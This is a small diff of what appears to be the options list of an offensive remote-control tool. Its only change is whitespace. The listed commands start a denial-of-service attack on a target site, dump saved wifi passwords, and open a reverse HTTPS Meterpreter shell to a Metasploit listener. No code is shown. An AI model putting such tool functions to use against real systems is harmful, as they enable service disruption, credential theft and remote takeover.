@@ -45,7 +45,7 @@ Options :
 
      ~DOS -A "www.targetsite.com"      Starts a denial of service atack
 
-     ~WIFI-LIST 						            Dumps all wifi history data with passwords
+     ~WIFI-LIST 						           Dumps all wifi history data with passwords
 
      ~METERPRETER -A "127.0.0.1:8888"  Creates a reverse https meterpreter connection to metasploit
 
